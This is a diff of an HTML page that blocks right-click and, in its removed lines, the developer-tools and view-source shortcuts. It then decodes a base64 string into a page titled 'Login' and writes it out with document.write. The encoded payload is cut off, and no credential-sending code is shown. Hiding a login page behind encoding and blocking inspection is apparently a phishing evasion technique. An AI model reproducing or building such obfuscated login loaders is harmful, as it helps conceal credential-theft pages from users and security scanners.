@@ -1,64 +1,33 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <script>
-// Block right-click
-document.addEventListener("contextmenu", function (e) {
-    e.preventDefault();
-});
-
-// Block common inspect / devtools keys
-document.addEventListener("keydown", function (e) {
-
-    // F12
-    if (e.key === "F12") {
-        e.preventDefault();
-    }
-
-    // Ctrl+Shift+I / J / C (Windows/Linux)
-    if (e.ctrlKey && e.shiftKey) {
-        const k = e.key.toLowerCase();
-        if (k === "i" || k === "j" || k === "c") {
-            e.preventDefault();
-        }
-    }
-
-    // Ctrl+U (view source)
-    if (e.ctrlKey && e.key.toLowerCase() === "u") {
-        e.preventDefault();
-    }
-
-    // Ctrl+Shift+K (Firefox console)
-    if (e.ctrlKey && e.shiftKey && e.key.toLowerCase() === "k") {
-        e.preventDefault();
-    }
-
-    // Cmd (Mac) + Option + I/J/C/U
-    if (e.metaKey && e.altKey) {
-        const k = e.key.toLowerCase();
-        if (["i", "j", "c", "u"].includes(k)) {
-            e.preventDefault();
-        }
-    }
-
-});
-</script>
 <meta charset="UTF-8">
 <title>Loading...</title>
+
+<script>
+document.addEventListener("contextmenu", e => e.preventDefault());
+    
+    
+</script>
+
 </head>
 <body>
 
 <script>
 (function () {
 
-var encoded =
-"PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CjxtZXRhIGNoYXJzZXQ9IlVURi04Ij4KPG1ldGEgbmFtZT0idmlld3BvcnQiIGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCwgaW5pdGlhbC1zY2FsZT0xLjAiPgo8dGl0bGU+TG9naW48L3RpdGxlPgo8c3R5bGU+Cioge2JveC1zaXppbmc6Ym9yZGVyLWJveDttYXJnaW46MDtwYWRkaW5nOjB9CmJvZHl7YmFja2dyb3VuZDp# (truncated for message safety)";
+var encoded = "PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CjxtZXRhIGNoYXJzZXQ9IlVURi04Ij4KPG1ldGEgbmFtZT0idmlld3BvcnQiIGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCwgaW5pdGlhbC1zY2FsZT0xLjAiPgo8dGl0bGU+TG9naW48L3RpdGxlPgo8c3R5bGU+Cioge2JveC1zaXppbmc6Ym9yZGVyLWJveDttYXJnaW46MDtwYWRkaW5nOjB9CmJvZHl7YmFja2dyb3VuZDp";
 
-var html = atob(encoded);
+try {
+    var html = atob(encoded);
 
-document.open();
-document.write(html);
-document.close();
+    document.open();
+    document.write(html);
+    document.close();
+
+} catch (e) {
+    document.body.innerHTML = "Failed to load login page.";
+}
 
 })();
 </script>
